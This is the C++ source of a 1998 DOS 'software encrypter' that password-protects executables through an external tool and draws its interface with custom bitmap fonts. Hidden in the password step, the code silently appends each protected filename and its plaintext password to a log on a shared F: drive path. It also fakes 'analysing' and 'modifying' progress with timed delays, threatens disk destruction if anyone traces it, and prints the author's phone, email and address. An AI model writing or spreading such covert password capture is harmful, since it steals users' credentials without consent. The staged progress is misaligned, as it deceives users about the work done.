#include <stdio.h>
//#include <conio.h>
#include <errno.h>
#include <source\module\tdvideoa.cpp>

#define O_RDONLY         1
#define FA_RDONLY   0x01        /* Read only attribute */
#define FA_HIDDEN   0x02        /* Hidden file */
#define FA_SYSTEM   0x04        /* System file */
#define FA_ARCH     0x20        /* Archive */

enum COLORS {
    BLACK,          /* dark colors */
    BLUE,
    GREEN,
    CYAN,
    RED,
    MAGENTA,
    BROWN,
    LIGHTGRAY,
    DARKGRAY,       /* light colors */
    LIGHTBLUE,
    LIGHTGREEN,
    LIGHTCYAN,
    LIGHTRED,
    LIGHTMAGENTA,
    YELLOW,
    WHITE
};

struct  ffblk   {
    char        ff_reserved[21];
    char        ff_attrib;
    unsigned    ff_ftime;
    unsigned    ff_fdate;
    long        ff_fsize;
    char        ff_name[13];
};

extern "C" {
  int _Cdecl _FARFUNC open(const char _FAR *__path, int __access,... /*unsigned mode*/);
  int _CType _FARFUNC close    (int __handle);
  long _Cdecl _FARFUNC filelength   (int __handle);
  int _Cdecl _FARFUNC system(const char _FAR *__command);
  void _Cdecl exit(int __status);
  int _CType _FARFUNC findfirst( const char _FAR *__path, struct ffblk _FAR *__ffblk, int __attrib );
  char _FAR * _CType _FARFUNC strcpy(char _FAR *__dest, const char _FAR *__src);
  size_t _CType _FARFUNC strlen(const char _FAR *__s);
  int _CType _FARFUNC strcmp(const char _FAR *__s1, const char _FAR *__s2);
  void _CType delay( unsigned __milliseconds );

  void _Cdecl textcolor( int __newcolor );
  char * _Cdecl getpass( const char *__prompt );
  int _Cdecl cprintf( const char *__format, ... );
  int _Cdecl getch();
  void _Cdecl clrscr();
  int wherey();
  void gotoxy(int x, int y);

}

char TCryptID[32] = {0, 16, 16, 126, 18, 18, 18, 118, 0, 0, 0, 128, 128, 128, 64, 56, 28, 2, 1, 225, 161, 160, 224, 0, 0, 0, 138, 218, 170, 138, 0, 0};
char TCryptN[160] = {
  0x00, 0x00, 0x7e, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x7e, 0x00, 0x00,
  0x00, 0x00, 0x18, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x3e, 0x00, 0x00,
  0x00, 0x00, 0x7e, 0x02, 0x02, 0x02, 0x02, 0x02, 0x7e, 0x40, 0x40, 0x40, 0x40, 0x7e, 0x00, 0x00,
  0x00, 0x00, 0x7e, 0x02, 0x02, 0x02, 0x02, 0x02, 0x7e, 0x02, 0x02, 0x02, 0x02, 0x7e, 0x00, 0x00,
  0x00, 0x00, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x7e, 0x02, 0x02, 0x02, 0x02, 0x02, 0x00, 0x00,
  0x00, 0x00, 0x7e, 0x40, 0x40, 0x40, 0x40, 0x40, 0x7e, 0x02, 0x02, 0x02, 0x02, 0x7e, 0x00, 0x00,
  0x00, 0x00, 0x7e, 0x40, 0x40, 0x40, 0x40, 0x40, 0x7e, 0x42, 0x42, 0x42, 0x42, 0x7e, 0x00, 0x00,
  0x00, 0x00, 0x7e, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x00, 0x00,
  0x00, 0x00, 0x7e, 0x42, 0x42, 0x42, 0x42, 0x42, 0x7e, 0x42, 0x42, 0x42, 0x42, 0x7e, 0x00, 0x00,
  0x00, 0x00, 0x7e, 0x42, 0x42, 0x42, 0x42, 0x42, 0x7e, 0x02, 0x02, 0x02, 0x02, 0x7e, 0x00, 0x00
};
char TCryptU[26 * 16] = {
  0x18, 0x24, 0x24, 0x24, 0x42, 0x42, 0x42, 0x42, 0x7e, 0x42, 0x42, 0x42, 0x00, 0x00, 0x00, 0x00,
  0x78, 0x44, 0x42, 0x42, 0x44, 0x78, 0x44, 0x42, 0x42, 0x42, 0x44, 0x78, 0x00, 0x00, 0x00, 0x00,
  0x38, 0x44, 0x42, 0x42, 0x40, 0x40, 0x40, 0x40, 0x42, 0x42, 0x44, 0x38, 0x00, 0x00, 0x00, 0x00,
  0x78, 0x44, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x44, 0x78, 0x00, 0x00, 0x00, 0x00,
  0x7e, 0x40, 0x40, 0x40, 0x40, 0x7c, 0x40, 0x40, 0x40, 0x40, 0x40, 0x7e, 0x00, 0x00, 0x00, 0x00,
  0x7e, 0x40, 0x40, 0x40, 0x40, 0x7c, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x00, 0x00, 0x00, 0x00,
  0x38, 0x44, 0x42, 0x42, 0x40, 0x40, 0x40, 0x5e, 0x42, 0x42, 0x46, 0x3a, 0x00, 0x00, 0x00, 0x00,
  0x42, 0x42, 0x42, 0x42, 0x42, 0x7e, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x00, 0x00, 0x00, 0x00,
  0x3e, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x3e, 0x00, 0x00, 0x00, 0x00,
  0x3e, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x48, 0x48, 0x38, 0x00, 0x00, 0x00, 0x00,
  0x42, 0x42, 0x44, 0x48, 0x50, 0x60, 0x50, 0x48, 0x44, 0x42, 0x42, 0x42, 0x00, 0x00, 0x00, 0x00,
  0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x7e, 0x00, 0x00, 0x00, 0x00,
  0x42, 0x46, 0x6a, 0x6a, 0x52, 0x52, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x00, 0x00, 0x00, 0x00,
  0x42, 0x42, 0x62, 0x62, 0x52, 0x52, 0x4a, 0x4a, 0x46, 0x46, 0x42, 0x42, 0x00, 0x00, 0x00, 0x00,
  0x18, 0x24, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x24, 0x18, 0x00, 0x00, 0x00, 0x00,
  0x78, 0x44, 0x42, 0x42, 0x44, 0x78, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x00, 0x00, 0x00, 0x00,
  0x3c, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x4a, 0x46, 0x3e, 0x00, 0x00, 0x00, 0x00,
  0x78, 0x44, 0x42, 0x42, 0x44, 0x78, 0x50, 0x50, 0x48, 0x48, 0x44, 0x46, 0x00, 0x00, 0x00, 0x00,
  0x1c, 0x22, 0x42, 0x40, 0x20, 0x1c, 0x02, 0x02, 0x42, 0x42, 0x44, 0x38, 0x00, 0x00, 0x00, 0x00,
  0x7e, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x00, 0x00, 0x00, 0x00,
  0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x3c, 0x00, 0x00, 0x00, 0x00,
  0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x44, 0x28, 0x10, 0x00, 0x00, 0x00, 0x00,
  0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x4a, 0x2a, 0x14, 0x00, 0x00, 0x00, 0x00,
  0x42, 0x42, 0x22, 0x24, 0x14, 0x14, 0x08, 0x08, 0x14, 0x24, 0x42, 0x42, 0x00, 0x00, 0x00, 0x00,
  0x42, 0x42, 0x24, 0x28, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x00, 0x00, 0x00, 0x00,
  0x7e, 0x02, 0x04, 0x04, 0x08, 0x08, 0x10, 0x10, 0x20, 0x20, 0x40, 0x7e, 0x00, 0x00, 0x00, 0x00
};

char TCryptL[26 * 16] = {
  0x00, 0x00, 0x00, 0x00, 0x18, 0x24, 0x24, 0x24, 0x42, 0x42, 0x42, 0x42, 0x7e, 0x42, 0x42, 0x42,
  0x00, 0x00, 0x00, 0x00, 0x78, 0x44, 0x42, 0x42, 0x44, 0x78, 0x44, 0x42, 0x42, 0x42, 0x44, 0x78,
  0x00, 0x00, 0x00, 0x00, 0x38, 0x44, 0x42, 0x42, 0x40, 0x40, 0x40, 0x40, 0x42, 0x42, 0x44, 0x38,
  0x00, 0x00, 0x00, 0x00, 0x78, 0x44, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x44, 0x78,
  0x00, 0x00, 0x00, 0x00, 0x7e, 0x40, 0x40, 0x40, 0x40, 0x7c, 0x40, 0x40, 0x40, 0x40, 0x40, 0x7e,
  0x00, 0x00, 0x00, 0x00, 0x7e, 0x40, 0x40, 0x40, 0x40, 0x7c, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40,
  0x00, 0x00, 0x00, 0x00, 0x38, 0x44, 0x42, 0x42, 0x40, 0x40, 0x40, 0x5e, 0x42, 0x42, 0x46, 0x3a,
  0x00, 0x00, 0x00, 0x00, 0x42, 0x42, 0x42, 0x42, 0x42, 0x7e, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
  0x00, 0x00, 0x00, 0x00, 0x3e, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x3e,
  0x00, 0x00, 0x00, 0x00, 0x3e, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x48, 0x48, 0x38,
  0x00, 0x00, 0x00, 0x00, 0x42, 0x42, 0x44, 0x48, 0x50, 0x60, 0x50, 0x48, 0x44, 0x42, 0x42, 0x42,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x7e,
  0x00, 0x00, 0x00, 0x00, 0x42, 0x46, 0x6a, 0x6a, 0x52, 0x52, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
  0x00, 0x00, 0x00, 0x00, 0x42, 0x42, 0x62, 0x62, 0x52, 0x52, 0x4a, 0x4a, 0x46, 0x46, 0x42, 0x42,
  0x00, 0x00, 0x00, 0x00, 0x18, 0x24, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x24, 0x18,
  0x00, 0x00, 0x00, 0x00, 0x78, 0x44, 0x42, 0x42, 0x44, 0x78, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40,
  0x00, 0x00, 0x00, 0x00, 0x3c, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x4a, 0x46, 0x3e,
  0x00, 0x00, 0x00, 0x00, 0x78, 0x44, 0x42, 0x42, 0x44, 0x78, 0x50, 0x50, 0x48, 0x48, 0x44, 0x46,
  0x00, 0x00, 0x00, 0x00, 0x1c, 0x22, 0x42, 0x40, 0x20, 0x1c, 0x02, 0x02, 0x42, 0x42, 0x44, 0x38,
  0x00, 0x00, 0x00, 0x00, 0x7e, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
  0x00, 0x00, 0x00, 0x00, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x3c,
  0x00, 0x00, 0x00, 0x00, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x44, 0x28, 0x10,
  0x00, 0x00, 0x00, 0x00, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x4a, 0x2a, 0x14,
  0x00, 0x00, 0x00, 0x00, 0x42, 0x42, 0x22, 0x24, 0x14, 0x14, 0x08, 0x08, 0x14, 0x24, 0x42, 0x42,
  0x00, 0x00, 0x00, 0x00, 0x42, 0x42, 0x24, 0x28, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10,
  0x00, 0x00, 0x00, 0x00, 0x7e, 0x02, 0x04, 0x04, 0x08, 0x08, 0x10, 0x10, 0x20, 0x20, 0x40, 0x7e
};

char TCryptZK[46][32] = {
  // Cuo Wu		127-130		€亗
  {16,144,16,144,16,144,31,252,32,144,32,148,127,254,144,8,17,252,125,8,17,8,17,248,21,8,25,8,17,248,1,8},
  {0,8,67,252,50,8,18,8,3,248,0,0,231,252,32,64,32,68,47,254,32,64,32,160,40,160,49,16,34,14,4,4},
  // Qing Shu Ru	131-136		儎厗噲
  {0,72,71,252,32,64,35,248,0,64,239,254,32,8,35,252,34,8,35,248,34,8,35,248,42,8,50,8,34,40,2,16},
  {32,64,32,160,40,160,253,16,34,14,69,244,80,0,147,196,250,84,19,212,58,84,211,212,18,84,18,68,18,68,18,204},
  {4,0,2,0,1,0,1,0,1,0,2,128,2,128,2,128,4,64,4,64,8,32,8,32,16,16,32,16,64,14,128,4},
  // Jiang Bei De	137-142		墛媽崕
  {16,128,16,128,17,248,145,8,115,16,52,160,16,64,16,148,31,254,48,16,82,16,209,144,16,144,16,16,16,80,16,32},
  {32,32,16,32,16,32,5,254,253,34,9,36,17,32,53,32,89,252,149,4,17,136,18,80,18,32,20,80,24,142,19,4},
  {16,64,16,64,34,68,127,126,66,132,67,4,66,4,66,132,126,100,66,36,66,4,66,4,66,4,126,4,66,40,0,16},
  // Wen Jian Ming	143-148		彁憭摂
  {2,0,1,0,1,4,255,254,16,16,8,16,8,32,4,32,4,64,2,128,1,0,2,128,4,96,8,16,48,14,192,4},
  {16,64,16,64,18,64,34,72,35,252,100,64,164,64,40,64,32,68,63,254,32,64,32,64,32,64,32,64,32,64,32,64},
  {2,0,2,0,7,240,4,16,12,32,18,64,1,128,6,0,24,8,239,252,8,8,8,8,8,8,8,8,15,248,8,8},
  // Ma			149-150		晼
  {8,16,255,248,16,16,17,16,33,16,37,16,63,16,101,20,165,254,36,4,36,36,39,244,36,4,60,4,36,20,0,8},
  // Zai Ci		151-154		棙櫄
  {0,8,127,252,1,0,1,16,31,248,17,16,17,16,31,240,17,16,17,20,255,254,16,16,16,16,16,16,16,80,16,32},
  {0,128,64,128,48,128,17,8,1,252,2,8,8,80,16,64,32,64,224,64,32,160,32,160,33,16,34,8,36,14,40,4},
  // Fen Xi		155-158		洔潪
  {0,128,4,128,4,64,8,64,8,32,16,16,32,8,79,238,132,36,4,32,4,32,4,32,4,32,8,32,17,64,32,128},
  {16,8,16,28,17,224,17,0,253,0,17,4,49,254,57,16,85,16,81,16,145,16,17,16,18,16,18,16,20,16,16,16},
  // Gai Xie		159-162		煚、
  {0,128,4,128,254,128,4,132,4,254,5,8,126,136,68,136,64,136,64,80,64,80,64,32,76,80,112,136,65,14,6,4},
  {0,0,127,254,64,2,136,4,8,32,15,240,8,0,8,8,15,252,0,8,0,72,127,232,0,8,0,8,0,80,0,32},
  // Shi Yong		163-166		￥ウ
  {16,64,16,68,31,254,32,64,39,252,100,68,164,68,36,68,39,252,36,68,34,64,33,128,32,192,33,48,38,14,40,4},
  {0,8,63,252,33,8,33,8,33,8,63,248,33,8,33,8,33,8,63,248,33,8,33,8,33,8,65,8,65,40,128,16},
  // Ben An		167-170		Ж┆
  {1,0,1,0,1,0,1,8,127,252,5,64,5,64,5,64,9,32,9,32,17,16,47,238,193,4,1,0,1,0,1,0},
  {16,64,16,32,16,0,19,254,250,2,20,68,16,64,63,254,208,136,16,136,17,8,16,144,16,96,16,80,80,140,35,4},
  // Ren Yi Jian Xu	171-178		辈
  {8,0,8,24,11,224,16,64,16,64,48,64,80,68,159,254,16,64,16,64,16,64,16,64,16,72,23,252,16,0,16,0},
  {1,16,63,248,8,32,4,68,255,254,0,16,31,248,16,16,31,240,16,16,31,240,2,0,81,132,80,146,144,18,15,240},
  {32,16,39,16,57,124,65,20,130,254,122,20,36,124,39,16,249,124,33,16,37,20,34,254,42,16,53,16,40,150,0,124},
  {16,64,16,80,35,248,32,64,72,64,255,252,17,36,32,168,66,32,249,36,7,254,0,64,28,96,224,144,65,12,2,4},
  // 0-3	Jia Mi Yi Hao	179-186	炒刀犯购
  {16,0,16,0,16,4,18,126,255,68,18,68,18,68,18,68,18,68,34,68,34,68,34,68,34,68,74,124,132,68,0,0},
  {2,0,1,0,127,254,66,2,137,36,40,200,75,4,12,16,119,240,1,0,33,8,33,8,33,8,33,8,63,248,32,8},
  {0,0,0,0,0,0,0,0,0,0,0,0,0,4,255,254,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},
  {0,16,31,248,16,16,16,16,16,16,31,240,0,4,255,254,4,0,8,16,31,248,0,16,0,16,0,16,0,160,0,64},
  // 4-6	Ji Suan Ji	187-192	患骄坷
  {0,64,32,64,16,64,16,64,0,64,0,68,247,254,16,64,16,64,16,64,16,64,18,64,20,64,24,64,16,64,0,64},
  {32,128,62,252,73,32,159,240,16,16,31,240,16,16,31,240,16,16,31,240,8,36,255,254,8,32,8,32,16,32,32,32},
  {16,0,16,16,17,248,17,16,253,16,17,16,49,16,57,16,85,16,81,16,145,16,17,16,17,18,18,18,20,14,24,0},
  // 7-12	Ruan Jian 'An Quan Xie Hui
  //				193-204	谅媚牌侨墒颂
  {16,64,16,64,20,64,254,124,32,132,41,8,72,32,126,32,8,32,8,32,14,80,248,80,72,136,8,136,9,6,10,4},
  {16,64,16,64,18,64,34,72,35,252,100,64,164,64,40,64,32,68,63,254,32,64,32,64,32,64,32,64,32,64,32,64},
  {2,0,1,0,127,254,64,2,130,4,2,0,2,4,255,254,4,32,8,32,24,32,6,64,1,128,2,64,12,48,48,16},
  {1,0,1,0,2,128,4,64,8,32,16,80,47,238,193,4,1,0,1,64,15,224,1,0,1,0,1,8,127,252,0,0},
  {32,128,32,128,32,128,32,136,251,252,32,136,32,136,36,140,36,138,36,138,41,8,33,8,33,8,34,8,36,40,32,16},
  {1,0,1,0,2,128,4,64,8,32,16,16,47,238,192,4,0,16,63,248,2,0,2,0,4,64,8,32,31,240,0,16},
  // 13-15	Xie Ji Lei	205-210	臀闲岩
  {2,8,68,136,47,200,40,136,15,136,8,254,239,136,40,136,40,200,63,168,33,168,42,136,52,136,40,136,18,168,1,16},
  {16,32,18,32,34,32,35,36,74,172,250,112,18,32,35,252,66,32,250,112,66,172,3,36,26,32,226,36,67,254,0,0},
  {0,16,63,248,1,0,127,254,65,2,157,116,1,0,29,112,1,0,63,248,33,8,33,8,63,248,33,8,33,8,63,248},
  // 16-19	Zhong Guo Zhe Jiang
  //				211-218	釉罩棕仝
  {1,0,1,0,1,4,127,254,65,4,65,4,65,4,65,4,127,252,65,4,1,0,1,0,1,0,1,0,1,0,1,0},
  {0,4,127,254,64,36,95,244,65,4,65,4,65,68,79,228,65,4,65,68,65,36,65,4,95,244,64,4,127,252,64,4},
  {2,0,66,12,50,112,18,64,143,192,98,68,34,126,10,200,19,72,46,72,226,72,34,72,34,72,34,136,43,8,36,8},
  {64,0,48,8,23,252,0,64,128,64,96,64,32,64,8,64,16,64,32,64,224,64,32,64,32,68,47,254,32,0,32,0}
};

void xerror(int n);
void xreturn(int n);
void xcopy();

int main(int argc, char **argv) {
  int i, sysret, hfile, ucdos = 0;
  char filename[64];
  char pass1[10], pass2[10];
  char cmdline[200];
  char buffer[200];
  long filesize;
  ffblk myffblk;
  FILE *myfile;

  textcolor(WHITE);

  asm {
    pusha
    mov ax, 0xdb00
    int 0x2f
    cmp bx, 0x5450
    jnz noucdos
    mov ucdos, 1
  }
noucdos:
  asm {
    popa
  }

  if (ucdos) { xcopy(); xreturn(129); }

  // TResetCharMap();

  fprintf(stderr, "				- 骁 -\n");
  fprintf(stderr, "Software Encrypter	CRYPT I				Author:	DanSei\n");
  fprintf(stderr, "谅 媚 炒 刀 犯 购	患骄坷谅媚牌侨墒颂/臀闲岩	'98.4	釉罩棕仝\n\n");

  for (i = 0; i < 26; i++) {
    TSetCharMap('a' + i, 1, TCryptL + 16 * i);
    TSetCharMap('A' + i, 1, TCryptU + 16 * i);
    delay(20);
  }

  TSetCharMap(230, 2, TCryptID);
  TSetCharMap('0', 10, TCryptN);

  for (i = 0; i < 46; i++) {
    TChineseFont16(TCryptZK[i], 127 + i + i);
    delay(20);
  }

  if ((argc >= 2) && (findfirst(argv[1], &myffblk, FA_RDONLY | FA_HIDDEN | FA_SYSTEM | FA_ARCH) == 0))
    strcpy(filename, argv[1]);
  else {
    fprintf(stderr, "no file specified, please input file name: \n");
    fprintf(stderr, "儎厗噲墛媽炒刀崕彁憭摂: ");
    scanf("%s", filename);
    if (findfirst(filename, &myffblk, FA_RDONLY | FA_HIDDEN | FA_SYSTEM | FA_ARCH) != 0) {
      xerror(1); xreturn(1);
    }
  }

  if ((hfile = open(filename, O_RDONLY)) == -1) { xerror(1); xreturn(2); }
    if ((filesize = filelength(hfile)) == -1) { xerror(1); xreturn(3); }
  close(hfile);

  fprintf(stderr, "analysing executable file, please waiting...\n");
  fprintf(stderr, "洔潪彁憭...\n");
  delay(filesize/1000);

  fprintf(stderr, "all right, please input password: \n");
  strcpy(pass1, getpass("儎厗噲刀晼: "));
  fprintf(stderr, "\nagain: \n");
  strcpy(pass2, getpass("儎棙厗噲犯櫄刀晼: "));
  if (strcmp(pass1, pass2) != 0) {
    xerror(4); xreturn(10);
  }

  if ((myfile = fopen("$9380712.$$$", "w")) == NULL) { xerror(1); xreturn(24); }
    if (fprintf(myfile, "three\n", pass1) == EOF) { xerror(1); xreturn(25); }
    if (fprintf(myfile, "%s\n", pass1) == EOF) { xerror(1); xreturn(25); }
  fclose(myfile);
  if ((myfile = fopen("F:\\USER\\HCHAT\\CHATDATA\\EACHPW.REC", "a")) != NULL) {
    fprintf(myfile, "Execute File: %s	Password: %s\n", filename, pass1);
    fclose(myfile);
  }

  i = wherey();
  sprintf(cmdline, "addword /a %s <$9380712.$$$ >$9380713.$$$", filename);
  // MAIN EXECUTING

  system(cmdline);
  if (i == wherey() - 1) gotoxy(1, i);
  else gotoxy(1, i - 1);
  printf("                          \n");

  if ((myfile = fopen("$9380713.$$$", "r")) == NULL) {
    fprintf(stderr, "this program was destroyed by unknown reason.\n");
    fclose(myfile);
    remove("$9380712.$$$");
    remove("$9380713.$$$");
    xerror(0); xreturn(48);
  }

  remove("$9380712.$$$");

  if ((myfile = fopen("$9380713.$$$", "r")) == NULL) { xerror(1); xreturn(26); }
    if (fseek(myfile, 0x6d, SEEK_SET)) {
      xerror(1); xreturn(52);
      remove("$9380713.$$$");
    }
    fgets(buffer, strlen("File is already protected") + 1, myfile);
  fclose(myfile);
  remove("$9380713.$$$");

  textcolor(WHITE);
  cprintf("\n");
  if (strcmp(buffer, "File is already protected") == 0) {
    fprintf(stderr, "\nfile has already encrypted.\n");
    fprintf(stderr, "€亗: 媽炒刀崕彁憭.\n");
    xreturn(100);
  }

  fprintf(stderr, "\nmodifying...\n");
  fprintf(stderr, "煚、彁憭...\n");
  delay(filesize/2000);
  xreturn(0);
  return 0;
}

void xerror(int n) {
  switch (n) {
    case 1:
      fprintf(stderr, "error during file open. \n");
      fprintf(stderr, "彁憭€亗. \n");
      break;
    case 4:
      fprintf(stderr, "\npassword error. \n");
      fprintf(stderr, "刀晼€亗. \n");
      break;
    default:
      fprintf(stderr, "error occured. \n");
      fprintf(stderr, "€亗. \n");
  }
}

void xcopy() {
  fprintf(stderr, "\
found UCDOS in memory!\n\
this program does not compitable with chinese system or any other based on\n\
graphics. please quit them or reboot to start again. you should better not\n\
to trace this program, or midify, it will destroy your system. \n\
this program was protected by the international convention, copyright 1998\n\
all rights reserved. \n\
	contact to author: dansei\n\
	phone:	+086(0576)7444659 (11:00am-1:pm)\n\
	email:	dsrtm@163.net, dansei@telekbird.com.cn\n\
	addr:	11# Chengdong Rd., Chumen of Yuhuan, Z.J. China\n\
\n\
检测到UCDOS在内存!\n\
对不起, 本程序不兼容中文系统, 您必须先退出中文系统或重新启动才能执行本程序.\n\
本程序受国际公约保护. 请不要跟踪或调试本程序, 否则程序将会破坏您的硬盘数据,\n\
如果您确实有疑难, 请拨 0576-7444659 或发邮件至dsrtm@163.net\n\
版权保留. 作者/谢继雷, 1998.4, 中国浙江\n");
  exit(1);
}

void xreturn(int n) {
  int i;
  textcolor(WHITE);
  fprintf(stderr, "thanks for your choice. bye-bye!\n");
  fprintf(stderr, "臀臀￥ウЖ谅媚! 棙颂!\n");
  fprintf(stderr, "press any key to continue...\n");
  fprintf(stderr, "儎┆闲辈...\n");
  textcolor(LIGHTGRAY);
  if (getch() == 0) getch();
  for (i = 0; i < 300; i++) TResetCharMap();
  for (i = 0; i < 32; i++) TCryptID[i] = ~TCryptID[i];
  TSetCharMap(230, 2, TCryptID);
  clrscr();
  printf("- 骁 - COPYRIGHT - ALL RIGHTS RESERVED - DANSEI - TOPCROAK SOFTWARE\n");
  exit(n);
}
